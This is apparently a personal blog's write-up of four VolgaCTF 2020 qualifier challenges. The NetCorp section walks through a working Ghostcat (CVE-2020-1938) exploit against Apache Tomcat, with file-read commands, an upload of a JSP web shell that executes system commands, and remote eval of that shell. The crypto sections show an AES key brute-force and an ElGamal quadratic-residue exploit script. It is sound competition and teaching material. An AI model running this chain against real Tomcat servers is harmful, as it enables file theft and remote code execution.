---
path: /posts/2020-03-30-volgactf-2020-qualifier-writeups
title: VolgaCTF 2020 Qualifier Writeups
date: 2020-03-30
tags: ctf,infosec,writeup,crypto,web
---

Writeups for some VolgaCTF 2020 Qualifier challenges I did.

- web
    - [NetCorp](#netcorp)
- crypto
    - [Alternative](#alternative)
    - [Noname](#noname)
    - [Guess](#guess)

---

# NetCorp <a name="netcorp"></a>

## web (100pts)

> Another telecom provider. Hope these guys prepared well enough for the network load...
> 
> netcorp.q.2020.volgactf.ru

### Solution

The website seems to be quite plain and does not have much functionality. There is a "complaint" button but clicking it leads to a 404 page. If we try traversing backwards in the path, we get a `400` error and an error message is shown, which includes the name and version of the server.

```bash
$ nc -C netcorp.q.2020.volgactf.ru 7782
GET /../../../ HTTP/1.1

HTTP/1.1 400 
Content-Type: text/html;charset=utf-8
Content-Language: en
Content-Length: 1160
Date: Mon, 30 Mar 2020 04:07:59 GMT
Connection: close

<!doctype html><html lang="en"><head><title>HTTP Status 400 – Bad Request</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 – Bad Request</h1><hr class="line" /><p><b>Type</b> Status Report</p><p><b>Message</b> Invalid URI</p><p><b>Description</b> The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid request message framing, or deceptive request routing).</p><hr class="line" /><h3>Apache Tomcat/9.0.24</h3></body></html>
```

After a bit of research, we find that this version of Tomcat is vulnerable to a [recently published CVE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938) known as Ghostcat which allows for local file inclusion and, remote code execution if the server allows for file upload. There are many POCs for the exploit available on GitHub. [ajpShooter](https://github.com/00theway/Ghostcat-CNVD-2020-10487) is one that allows for file read and eval of jsp code.

The [Tomcat documentation](https://tomcat.apache.org/tomcat-9.0-doc/appdev/deployment.html) provides the standard directory layout which gives us an idea of what files to look for.

We begin by reading the deployment description which is located at `/WEB-INF/web.xml` and provides a mapping for servlets and paths.

```bash
$ python ajpShooter.py http://netcorp.q.2020.volgactf.ru:7782 8009 /WEB-INF/web.xml read

       _    _         __ _                 _            
      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ 
     //_\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|
    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   
    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   
         |__/|_|                                        
                                                00theway,just for test
    

[<] 200 200
[<] Accept-Ranges: bytes
[<] ETag: W/"1000-1585246342000"
[<] Last-Modified: Thu, 26 Mar 2020 18:12:22 GMT
[<] Content-Type: application/xml
[<] Content-Length: 1000

<!DOCTYPE web-app PUBLIC
 "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
 "http://java.sun.com/dtd/web-app_2_3.dtd" >

<web-app>
  <display-name>NetCorp</display-name>
  
  
  <servlet>
  	<servlet-name>ServeScreenshot</servlet-name>
  	<display-name>ServeScreenshot</display-name>
  	<servlet-class>ru.volgactf.netcorp.ServeScreenshotServlet</servlet-class>
  </servlet>
  
  <servlet-mapping>
  	<servlet-name>ServeScreenshot</servlet-name>
  	<url-pattern>/ServeScreenshot</url-pattern>
  </servlet-mapping>


	<servlet>
		<servlet-name>ServeComplaint</servlet-name>
		<display-name>ServeComplaint</display-name>
		<description>Complaint info</description>
		<servlet-class>ru.volgactf.netcorp.ServeComplaintServlet</servlet-class>
	</servlet>

	<servlet-mapping>
		<servlet-name>ServeComplaint</servlet-name>
		<url-pattern>/ServeComplaint</url-pattern>
	</servlet-mapping>

	<error-page>
		<error-code>404</error-code>
		<location>/404.html</location>
	</error-page>

  
  
</web-app>
```

We see that there are two interesting servlets: `ServeScreenshot` and `ServeComplaint`. We can dump the class files for these using ajpShooter:

```bash
python ajpShooter.py http://netcorp.q.2020.volgactf.ru:7782 8009 /WEB-INF/classes/ru/volgactf/netcorp/ServeComplaintServlet.class read -o complaint.class

python ajpShooter.py http://netcorp.q.2020.volgactf.ru:7782 8009 /WEB-INF/classes/ru/volgactf/netcorp/ServeScreenshotServlet.class read -o screenshot.class
```

These are Java class files, but we can use a decompiler (e.g. [JAD](https://varaneckas.com/jad/)) to retrieve the Java source code.

```bash
$ jad -s java *class
```

We get the two Java source code files `ServeComplaintServlet.java` and `ServeScreenshotServlet.java`.

The `ServeComplaintServlet` class doesn't have anything interesting in it, so we don't include it. However, the `ServeScreenshotServlet` class handles a route which allows for file upload.

`ServeScreenshotServlet.java``

```
// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.geocities.com/kpdus/jad.html
// Decompiler options: packimports(3) 
// Source File Name:   ServeScreenshotServlet.java

package ru.volgactf.netcorp;

import java.io.*;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Collection;
import java.util.Iterator;
import javax.servlet.*;
import javax.servlet.http.*;

public class ServeScreenshotServlet extends HttpServlet
{

    public ServeScreenshotServlet()
    {
        System.out.println("ServeScreenshotServlet Constructor called!");
    }

    public void init(ServletConfig config)
        throws ServletException
    {
        System.out.println("ServeScreenshotServlet \"Init\" method called");
    }

    public void destroy()
    {
        System.out.println("ServeScreenshotServlet \"Destroy\" method called");
    }

    protected void doPost(HttpServletRequest request, HttpServletResponse response)
        throws ServletException, IOException
    {
        String appPath = request.getServletContext().getRealPath("");
        String savePath = (new StringBuilder()).append(appPath).append("uploads").toString();
        File fileSaveDir = new File(savePath);
        if(!fileSaveDir.exists())
            fileSaveDir.mkdir();
        String submut = request.getParameter("submit");
        if(submut != null)
            if(submut.equals("true"));
        PrintWriter out = request.getParts().iterator();
        do
        {
            if(!out.hasNext())
                break;
            Part part = (Part)out.next();
            String fileName = extractFileName(part);
            fileName = (new File(fileName)).getName();
            String hashedFileName = generateFileName(fileName);
            String path = (new StringBuilder()).append(savePath).append(File.separator).append(hashedFileName).toString();
            if(!path.equals("Error"))
                part.write(path);
        } while(true);
        out = response.getWriter();
        response.setContentType("application/json");
        response.setCharacterEncoding("UTF-8");
        out.print(String.format("{'success':'%s'}", new Object[] {
            "true"
        }));
        out.flush();
    }

    private String generateFileName(String fileName)
    {
        String s2;
        StringBuilder sb;
        MessageDigest md = MessageDigest.getInstance("MD5");
        md.update(fileName.getBytes());
        byte digest[] = md.digest();
        s2 = (new BigInteger(1, digest)).toString(16);
        sb = new StringBuilder(32);
        int i = 0;
        for(int count = 32 - s2.length(); i < count; i++)
            sb.append("0");

        return sb.append(s2).toString();
        NoSuchAlgorithmException e;
        e;
        e.printStackTrace();
        return "Error";
    }

    private String extractFileName(Part part)
    {
        String contentDisp = part.getHeader("content-disposition");
        String items[] = contentDisp.split(";");
        String as[] = items;
        int i = as.length;
        for(int j = 0; j < i; j++)
        {
            String s = as[j];
            if(s.trim().startsWith("filename"))
                return s.substring(s.indexOf("=") + 2, s.length() - 1);
        }

        return "";
    }

    private static final String SAVE_DIR = "uploads";
}
```

We see that uploaded files are being placed into `/uploads/` but with a filename generated by the `generateFileName` function. If we can upload a malicious jsp file, guess the filename, and exploit the Ghostcat vulnerability to eval it, we should be able to achieve code execution.

Instead of trying to reverse engineer what the `generateFileName` function is doing, we can just copy the code and run it to generate the filename for us:

`FileName.java`:

```java
import java.io.PrintStream;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

public class FileName {
    static String generateFileName(String s) {
        try {
            String s1;
            StringBuilder stringbuilder;
            MessageDigest messagedigest = MessageDigest.getInstance("MD5");
            messagedigest.update(s.getBytes());
            byte abyte0[] = messagedigest.digest();
            s1 = (new BigInteger(1, abyte0)).toString(16);
            stringbuilder = new StringBuilder(32);
            int i = 0;
            for(int j = 32 - s1.length(); i < j; i++)
                stringbuilder.append("0");

            return stringbuilder.append(s1).toString();
        } catch(NoSuchAlgorithmException e) {
            return "Bad";
        }
    }

    public static void main(String args[]) {
        String s = args[0];
        System.out.println(generateFileName(s));
    }
}
```

And our malicious jsp payload that we'll upload via the `/ServeScreenshot` route:

`malicious.jsp`:

```java
<%@ page import="java.util.*,java.io.*"%>
<% 
String cmd = "cat flag.txt";
out.println("Command: " + cmd);
Process p = Runtime.getRuntime().exec(cmd);
OutputStream os = p.getOutputStream();
InputStream in = p.getInputStream();
DataInputStream dis = new DataInputStream(in);
String disr = dis.readLine();
while ( disr != null ) {
        out.println(disr); 
        disr = dis.readLine(); 
}
%>
```

All that's left is to put the pieces together!

First we upload the file:

```bash
$ http -f POST http://netcorp.q.2020.volgactf.ru:7782/ServeScreenshot malicious.jsp@malicious.jsp

HTTP/1.1 200 
Content-Type: application/json;charset=ISO-8859-1
Date: Mon, 30 Mar 2020 04:37:01 GMT
Transfer-Encoding: chunked

{'success':'true'}
```

We then generate the filename:

```bash
$ javac FileName.java
$ java FileName malicious.jsp
be3562dbb6d7471dd8a96790687cfd4c
```

Then we use `ajpShooter` to eval the jsp code on the server:

```bash
$ python ajpShooter.py http://netcorp.q.2020.volgactf.ru:7782 8009 /uploads/be3562dbb6d7471dd8a96790687cfd4c eval

       _    _         __ _                 _            
      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ 
     //_\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|
    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   
    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   
         |__/|_|                                        
                                                00theway,just for test
    

[<] 200 200
[<] Set-Cookie: JSESSIONID=CAD711DEA4FD70DED1E788B40A3CC7C5; Path=/; HttpOnly
[<] Content-Type: text/html;charset=ISO-8859-1
[<] Content-Length: 99


Command: cat flag.txt
VolgaCTF{qualification_unites_and_real_awesome_nothing_though_i_need_else}
```

Which reveals the flag!

---

# Alternative <a name="alternative"></a>

## crypto (50pts)

> This task is _alternative_.
>
> alternative.q.2020.volgactf.ru:7780/

### Solution

When we navigate to the page (in Chromium), we get a `ERR_CERT_AUTHORITY_INVALID` warning (by Chromium) telling us that the TLS certificate is self signed. If we proceed despite the warning, we see that the page is very bare. Looking through the details of the certificate, we see a field named `Certificate Subject Alternative Name` which lists the string `s0.many.fields.in.certificate.com` as a DNS name. It turns out `VolgaCTF{s0.many.fields.in.certificate.com}` is the flag.

---

# Noname <a name="noname"></a>

## crypto (100pts)

> I have Noname; I am but two days old.
>

`encrypted`:
```
uzF9t5fs3BC5MfPGe346gXrDmTIGGAIXJS88mZntUWoMn5fKYCxcVLmNjqwwHc2sCO3eFGGXY3cswMnO7OZXOw==
```

`encryptor.py`:
```python
from Crypto.Cipher import AES
from secret import flag
import time
from hashlib import md5


key = md5(str(int(time.time()))).digest()
padding = 16 - len(flag) % 16
aes = AES.new(key, AES.MODE_ECB)
outData = aes.encrypt(flag + padding * hex(padding)[2:].decode('hex'))
print outData.encode('base64')
```

### Solution

We notice in the encryptor script that the key being used is the md5 hexdigest of the current time. The description hints that this script was run two days ago (from the time of the CTF start, presumably) so we simply bruteforce the key with this in mind:

```python
from Crypto.Cipher import AES
from base64 import b64decode
import time
from hashlib import md5

enc = b64decode(open('encrypted').read())

for i in range(-24*60*60*3, 0):
    key = md5(str(int(time.time()+i))).digest()
    aes = AES.new(key, AES.MODE_ECB)
    f = aes.decrypt(enc)
    if 'Volga' in f:
        print(f)
```

```bash
$ python2 solve.py
VolgaCTF{5om3tim3s_8rutf0rc3_i5_th3_345iest_w4y}
```

---

# Guess <a name="guess"></a>

## crypto (200pts)

> Try to guess all encrypted bits and get your reward!
>
> `nc guess.q.2020.volgactf.ru 7777`

We are also given the script that runs on the server:

```python
#!/usr/bin/python
# -*- coding: utf-8 -*-
from __future__ import print_function
from Crypto.PublicKey import ElGamal
from Crypto import Random
from flag_file import flag
import Crypto.Random.random
import time
import sys


"""
    Communication utils
"""

def read_message():
    return sys.stdin.readline()


def send_message(message):
    sys.stdout.write('{0}\r\n'.format(message))
    sys.stdout.flush()


def eprint(*args, **kwargs):
    print(*args, file=sys.stderr, **kwargs)


"""
    Algebra
"""

def kronecker(x, p):
    q = (p - 1) / 2
    return pow(x, q, p)


def findQNR(p):
    r = Crypto.Random.random.randrange(2, p - 1)
    while kronecker(r, p) == 1:
        r = Crypto.Random.random.randrange(2, p-1)
    return r


def findQR(p):
    r = Crypto.Random.random.randrange(2, p - 1) 
    return pow(r, 2, p)


"""
    Main
"""

if __name__ == '__main__':
    try:
        while True:
            key = ElGamal.generate(512, Random.new().read)
            runs = 1000
            successful_tries = 0

            send_message('(y, p) = ({0}, {1})'.format(key.y, key.p))

            for i in xrange(runs):
                plaintexts = dict()
                plaintexts[0] = findQNR(key.p)
                plaintexts[1] = findQR(key.p)

                challenge_bit = Crypto.Random.random.randrange(0,2)
                eprint('[{0}][INFO] Bit {1} was generated.'.format(time.strftime("%Y-%m-%d. %H:%M:%S"), challenge_bit))
                r = Crypto.Random.random.randrange(1,key.p-1) 
                challenge = key.encrypt(plaintexts[challenge_bit], r)

                # Send challenge
                send_message(challenge)

                # Receive challenge_bit
                received_bit = read_message()
                eprint('[{0}][INFO] Bit {1} was received.'.format(time.strftime("%Y-%m-%d. %H:%M:%S"), received_bit))
                if int(received_bit) == challenge_bit:
                    successful_tries += 1
                    eprint(successful_tries)
                    
            if successful_tries == runs:
                send_message(flag)

    except Exception as ex:
        send_message('Something must have gone very, very wrong...')
        eprint('[{0}][ERROR] {1}'.format(time.strftime("%Y-%m-%d. %H:%M:%S"), ex))

    finally:
        pass
```

### Solution

We see that the [ElGamal cryptosystem](https://en.wikipedia.org/wiki/ElGamal_encryption) is being used. In order to get the flag, we must successfully solve a challenge set by the server 1000 times. The answer to each challenge is either `0` or `1`, but since we must solve 1000 of these challenges, it is not feasible to bruteforce and guess the answers.

We notice that in each challenge, there are two plaintexts being encrypted. We will call `plaintexts[0]` $s_0$ (or `s0`) and `plaintexts[1]` $s_1$ (or `s1`). These plaintexts are generated by the `findQNR` function and `findQR` function respectively. Then, the server uses ElGamal to encrypt this plaintext and sends the encryption to us. Our goal is to figure out which plaintext was sent.

Before we attempt to find the vulnerability in the challenge, we must first understand some important concepts. Firstly, we need to understand how ElGamal encryption works, and we need to understand what [quadratic residues](https://en.wikipedia.org/wiki/Quadratic_residue) are.

#### Mathematical Concepts/Notation

$\mathbb{F}_p$ denotes the [ring](https://en.wikipedia.org/wiki/Ring_(mathematics)) of integers modulo $p$. $\mathbb{F}_p^*$ denotes the [group](https://en.wikipedia.org/wiki/Group_(mathematics)) of [units](https://en.wikipedia.org/wiki/Unit_(ring_theory)) modulo $p$, that is, the set $\{1, 2, 3, \ldots, p - 1 \}$ (because $p$ is prime).

An element $g \in \mathbb{F}_p^*$ is called a generator of $\mathbb{F}_p^*$ if its powers generate every element of $\mathbb{F}_p^*$. i.e.
$$\mathbb{F}_p^* = \{1, g, g^2, g^3, \ldots, g^{p-2} \}$$

If $p$ is prime, such an element always exists.

#### ElGamal Cryptosystem

The ElGamal cryptosystem is a public key cryptosystem whose security is based on the discrete logarithm problem.

**Key Generation**: Alice chooses a large prime number $p$ and a number $g \in \mathbb{F}_p^*$ that is a generator for $\mathbb{F}_p^*$. She then chooses a secret number $x$ and computes $y = g^x \pmod p$. She publishes $(g, p, y)$ as her public key.

**Encryption**: Suppose Bob wants to send Alice a message $m$ using Alice's public key. He generates a random number $r$ such that $1 \leq r < p$. He then computes
$$c_1 \equiv g^r \pmod p \text{\hspace{0.2in} and \hspace{0.2in}} c_2 \equiv my^r \pmod p$$
and sends $(c_1, c_2)$ as the ciphertext.

**Decryption**: Decryption isn't involved in this challenge, but it isn't hard to show that Alice can retrieve the plaintext by computing
$$m \equiv c_2(c_1^x)^{-1} \pmod p$$

#### Quadratic Residues

**Definition ([Quadratic Residue](https://en.wikipedia.org/wiki/Quadratic_residue))**: Let $p$ be an odd prime and let $a$ be a number such that $p$ does not divide $a$. If there exists a number $c$ such that $c^2 \equiv a \pmod p$, then we say that $a$ is a *quadratic residue modulo* $p$, otherwise, we say that $a$ is a *quadratic nonresidue modulo* $p$.

**Proposition (Quadratic Residue Properties)**: Let $p$ be an odd prime number.
- (i) The product of two quadratic residues modulo $p$ is a quadratic residue modulo $p$.
- (ii) The product of a quadratic residue and a quadratic nonresidue modulo $p$ is a quadratic nonresidue modulo $p$.
- (iii) The product of two quadratic nonresidues modulo $p$ is a quadratic residue modulo $p$.

*Proof.* This proof uses [Fermat's Little Theorem](https://en.wikipedia.org/wiki/Fermats_little_theorem) which states that $a^{p-1} \equiv 1 \pmod p$ for prime $p$ and for integers $a$ such that $p$ does not divide $a$.

Let $g \in \mathbb{F}_p^*$ be a generator for $\mathbb{F}_p^*$. We claim that even powers of $g$ are quadratic residues modulo $p$. This claim can be proved with a proof by contradiction. Suppose that $g^{2k+1}$ is a quadratic residue modulo $p$. Then
$$g^{2k+1} \equiv m^2 \pmod p$$
for some integer $m$. From Fermat's Little Theorem, we know that $m^{p-1} \equiv 1 \pmod p$. So
$$m^{p-1} \equiv (m^2)^{\frac{p-1}{2}} \equiv (g^{2k+1})^{\frac{p-1}{2}} \equiv g^{k(p-1)} \cdot g^{\frac{p-1}{2}} \equiv (g^{p-1})^k \cdot g^{\frac{p-1}{2}} \equiv g^{\frac{p-1}{2}} \pmod p$$
which implies $g^{\frac{p-1}{2}} \equiv 1 \pmod p$. But this contradicts the fact that $g$ is a generator for $\mathbb{F}_p^*$ as there can only be one value of $l$ with $0 \leq l < p-1$ such that $g^l \equiv 1 \pmod p$ (that value is $0$).

Next, we let $a$ and $b$ be quadratic residues modulo $p$, and let $c$ and $d$ be quadratic nonresidues modulo $p$. We can write
$$\begin{aligned} a &\equiv x^2 \pmod p \\ b &\equiv y^2 \pmod p \\ c &\equiv w^{2j+1} \pmod p \\ d &\equiv z^{2k+1} \pmod p \end{aligned}$$

To prove (i), we see that
$$ab \equiv x^2 y^2 \equiv (xy)^2 \pmod p$$
and so $ab$ is a quadratic residue modulo $p$.

To prove (ii), we see that
$$ac \equiv x^2w^{2j+1} \pmod p$$
which cannot be expressed to an even power, hence, is a quadratic nonresidue modulo $p$.

Tp prove (iii), we see that
$$cd \equiv w^{2j+1}z^{2k+1} \equiv wz^{2j + 2k + 2} \equiv (wz^{j+k+1})^2 \pmod p$$
and so $cd$ is a quadratic residue modulo $p$.

#### Solving the challenge

The `findQNR` function uses [Euler's Criterion](https://en.wikipedia.org/wiki/Euler%27s_criterion) to find a quadratic nonresidue modulo $p$. The `findQR` function returns a quadratic residue modulo $p$. We see that $s_0$ is a quadratic nonresidue modulo $p$ and $s_1$ is a quadratic residue modulo $p$. Our goal has become to determine whether or not the plaintext value being encrypted was a quadratic nonresidue or a quadratic residue. We are given $c_1 \equiv g^r \pmod p$ and $c_2 \equiv my^r \pmod p$ and $y$ and $p$. Is there a way to determine whether $m$ is a quadratic residue or not from these values?

Notice that if $y$ is a quadratic residue, then $c_2$ is a quadratic residue if and only if $m$ is a quadratic residue.

Else, if $y$ is a quadratic nonresidue, whether or not $c_2$ is a quadratic residue will depend on $c_1$ (this is beacuse $y^r \equiv g^{rx} \pmod p$).
If $c_1$ is a quadratic residue, then $c_2$ is a quadratic residue if and only if $m$ is a quadratic residue. Else, if $c_1$ is a quadratic nonresidue, then $c_2$ is a quadratic residue if and only if $m$ is a quadratic nonresidue.

In summary:

```
If y is a QR:
    c2 is a QR iff M is a QR

If y is a QNR:
    if c1 is a QR:
        c2 is a QR iff M is a QR
    if c1 is a QNR:
        c2 is a QR iff M is a QNR
```

We can now write our exploit script:

```python
from pwn import remote

def ec(x, p):
    q = (p - 1) / 2
    return pow(x, q, p)

def qr(x, p):
    return ec(x, p) == 1

conn = remote('guess.q.2020.volgactf.ru', 7777)

y, p = map(int, conn.recvline().split('= (')[1][:-3].split(', '))

for i in range(1000):
    c1, c2 = eval(conn.recvline())

    b = ''
    if qr(y, p):
        if qr(c2, p):
            b = '1'
        else:
            b = '0'
    else:
        if qr(c1, p):
            if qr(c2, p):
                b = '1'
            else:
                b = '0'
        else:
            if qr(c2, p):
                b = '0'
            else:
                b = '1'
    conn.sendline(b)
    print('challenge', i)
print(conn.recvline())
```

Flag: `VolgaCTF{B3_c4r3ful_with_4lg0rithm5_impl3m3nt4ti0n5}`
